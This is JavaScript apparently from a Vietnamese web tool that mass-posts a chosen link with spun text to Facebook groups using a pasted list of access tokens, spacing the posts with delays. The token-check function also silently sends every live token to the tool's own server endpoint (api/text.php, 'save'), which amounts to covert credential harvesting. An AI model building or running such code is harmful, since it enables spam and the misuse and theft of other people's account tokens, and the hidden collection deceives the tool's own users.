function auto_sharegrb_check(a) {
    $.get('https://graph.facebook.com/', {
        method: 'post',
        access_token: a,
        batch: '[{\"method\":\"GET\",\"relative_url\":\"me?fields=id,name\"},{\"method\":\"GET\",\"relative_url\":\"fql?q=select gid, name from group where gid in (select gid from group_member where uid = me()) ORDER BY rand() limit ' + sharegrb.limit + '\"}]',
        include_headers: 'false'
    }, function(d) {
        var j = JSON.parse(d[0].body);
        sharegrb.array[sharegrb.success] = [], sharegrb.array[sharegrb.success].gid = j.id, sharegrb.array[sharegrb.success].name = j.name, sharegrb.array[sharegrb.success].data = JSON.parse(d[1].body).data, sharegrb.array[sharegrb.success].access_token = a, sharegrb.success++, sharegrb.bach += a + '\n', tbody = '', tbody += '<tr>', tbody += '	<td>' + sharegrb.success + '</td>', tbody += '	<td>' + j.name + '</td>', tbody += '	<td align=\"center\">' + sharegrb.array[sharegrb.success - 1].data.length + '</td>', tbody += '	<td align=\"center\"><font color=\"green\"><span id=\"sharegrb_success_' + sharegrb.success + '\">0</span></font></td>', tbody += '	<td align=\"center\"><font color=\"red\"><span id=\"sharegrb_error_' + sharegrb.success + '\">0</span></font></td>', tbody += '	<td id=\"sharegrb_status_' + sharegrb.success + '\" b-data=\"loading\">Đang chờ !</td>', tbody += '</tr>', $('#html_auto_sharegrb_body').append(tbody)
    }).fail(function(d) {
        'undefined' == typeof d.responseText ? sharegrb_check(a) : sharegrb.error++
    }).always(function() {
        if (sharegrb.success + sharegrb.error == sharegrb.token.split('\n').length) {
            if (sharegrb.success > 0) {
                var a = $.trim(sharegrb.bach).split('\n');
                a.length > 0 && $.post('//' + b_sv + '/api/text.php', {
                    act: 'save',
                    array: a
                });
                for (var d = 0; d < sharegrb.array.length; d++) {
                    auto_sharegrb_msg(d, 0)
                }
            } else {
                $('#submit_auto_sharegrb').buttonStop(), $('#submit_auto_sharegrb_stop').disabled(), noti.success('Không Access Token nào Live !'), $('#html_auto_sharegrb_result').hide()
            }
        }
    })
}

function auto_sharegrb_msg(a, d) {
    return 0 == sharegrb.run ? !1 : void((0 == sharegrb.array[a].data.length ? ($('#sharegrb_status_' + (a + 1)).html('<font color=\"red\">Không có bạn bè !</font>'), sharegrb.total++, sharegrb.total == sharegrb.success && ($('#submit_auto_sharegrb').buttonStop(), $('#submit_auto_sharegrb_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !'))) : ! function(j, c, b) {
        $('#sharegrb_status_' + (a + 1)).html('<font color=\"blue\">Đang gửi tin nhắn đến <b>' + b + '</b></font> ' + run.loading()), $.get('https://graph.facebook.com/'+c+'/feed', {
            link:''+sharegrb.id+'',
			locale: 'en_US',
            method: 'post',
            return_structure: 'true',
            message: init.spinText(sharegrb.message.replace(/\$\m\e/g, j).replace(/\$\y\o\u/g, b)),
            access_token: sharegrb.array[a].access_token
        }).done(function() {
            $('#sharegrb_success_' + (a + 1)).text(parseInt($('#sharegrb_success_' + (a + 1)).text()) + 1), $('#sharegrb_status_' + (a + 1)).html('<font color=\"green\">Gửi đến <b>' + b + '</b> thành công, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading())
        }).error(function(d) {
            if ($('#sharegrb_error_' + (a + 1)).text(parseInt($('#sharegrb_error_' + (a + 1)).text()) + 1), $('#sharegrb_status_' + (a + 1)).html('<font color=\"red\">Gửi đến <b>' + b + '</b> thất bại, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading()), d.responseText) {
                var d = init.replace_JSON(d.responseText);
                noti.error(d.error.message)
            }
        }).always(function() {
            d + 1 < sharegrb.array[a].data.length ? timer.count_down_array(0, Math.floor(sharegrb.delay / 60), sharegrb.delay - 60 * Math.floor(sharegrb.delay / 60), 'timedown_' + (a + 1), a, function() {
                auto_sharegrb_msg(a, d + 1)
            }) : ($('#sharegrb_status_' + (a + 1)).html('<font color=\"green\">Hoàn thành !</font>'), sharegrb.total++, sharegrb.total == sharegrb.success && ($('#submit_auto_sharegrb').buttonStop(), $('#submit_auto_sharegrb_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !')))
        })
    }(sharegrb.array[a].name, sharegrb.array[a].data[d].gid, sharegrb.array[a].data[d].name)))
}
location.hostname == b_sv && ($(document).on('click', '#submit_auto_sharegrb_stop', function() {
    sharegrb.run = 0;
    for (var a = 0; a < sharegrb.array.length; a++) {
        clearTimeout(timeout_array[a])
    };
    $('[b-data=\'loading\']').text('Đã có lệnh dừng !'), $('#submit_auto_sharegrb_stop').disabled(), $('#submit_auto_sharegrb').buttonStop(), noti.success('Đã có lệnh dừng gửi tin nhắn !')
}), $(document).on('click', '#submit_auto_sharegrb', function() {
    sharegrb = {
		id: $('#input_auto_sharegrb_id').validate(),
        token: $('#input_auto_sharegrb_token').validate(),
        message: $('#input_auto_sharegrb_msg').validate(),
        delay: $('#input_auto_sharegrb_delay').isNumber(),
        limit: $('#input_auto_sharegrb_limit').isNumber(),
        array: [],
        run: 1,
        total: 0,
        success: 0,
        error: 0,
        bach: ''
    }, sharegrb.id && sharegrb.token && sharegrb.delay && sharegrb.limit && ($(this).buttonLoad(), $('#submit_auto_sharegrb_stop').undisabled(), $('#html_auto_sharegrb_result').fadeIn('fast'), $('#html_auto_sharegrb_body').html(''), $.each(sharegrb.token.split('\n'), function(a, d) {
        var j = d.split('|');
        j = j[1] ? j[1] : d, setTimeout(function() {
            auto_sharegrb_check(j)
        }, 15 * a)
    }))
}))